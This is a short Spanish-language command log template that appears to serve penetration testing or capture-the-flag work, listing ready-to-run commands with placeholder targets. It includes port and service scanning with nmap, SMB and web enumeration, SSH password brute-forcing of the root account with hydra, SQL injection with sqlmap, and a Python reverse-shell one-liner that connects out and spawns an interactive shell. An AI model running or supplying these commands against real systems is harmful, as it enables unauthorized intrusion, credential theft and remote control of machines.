# LOG DE COMANDOS

- **Fecha:** [YYYY-MM-DD]

## Comandos Útiles

### Escaneo

```bash
# Puertos rápidos
nmap -p- --min-rate 3000 <IP>

# Servicios
nmap -sV -sC -p <PORTS> <IP>
```

### Enumeración

```bash
# SMB
enum4linux -a <IP>
smbclient -L //<IP>

# Web
whatweb http://<IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

### Explotación

```bash
# SSH
hydra -l root -P rockyou.txt ssh://<IP>

# SQL
sqlmap -u "http://<IP>/page?id=1" --batch
```

### Shell

```bash
# Reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Comandos Nuevos
- Comando 1
- Comando 2
